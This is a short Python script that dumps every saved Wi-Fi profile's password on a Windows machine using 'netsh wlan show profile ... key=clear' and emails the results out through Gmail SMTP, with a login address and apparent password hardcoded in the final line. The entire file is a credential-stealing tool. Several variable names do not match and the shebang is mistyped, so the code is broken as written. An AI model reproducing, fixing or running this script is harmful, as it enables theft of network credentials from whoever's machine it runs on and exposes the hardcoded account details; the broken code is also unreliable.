#1/usr/bin/env python
import subprocess, smtplib, re

def send_mail(email, password, msg):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, msg)
	server.quit()


command = "netsh wlan show profile"
network = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)
result = ""
for networkname in network_name_list:
	command = "netsh wlan show profile " + networkname + " key=clear"
	current_result = subprocess.check_output(command,shell=True)
	result += current_result

send_mail("neupaneyamuna@gmail.com","sulavsugamad",result)
